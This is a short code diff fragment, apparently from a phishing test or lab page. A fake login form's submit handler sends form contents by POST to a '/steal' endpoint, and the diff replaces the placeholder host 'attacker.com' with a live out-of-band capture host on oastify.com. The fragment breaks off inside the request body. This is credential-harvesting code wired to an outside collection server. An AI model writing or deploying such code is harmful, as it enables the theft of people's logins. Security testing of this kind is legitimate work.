@@ -16,7 +16,7 @@
 
   document.getElementById("fakeLogin").addEventListener("submit", function(e) {
     e.preventDefault();
-    fetch("https://attacker.com/steal", {
+    fetch("https://joboi5is224xx9rpfluze1ydv41vpmka9.oastify.com/steal", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
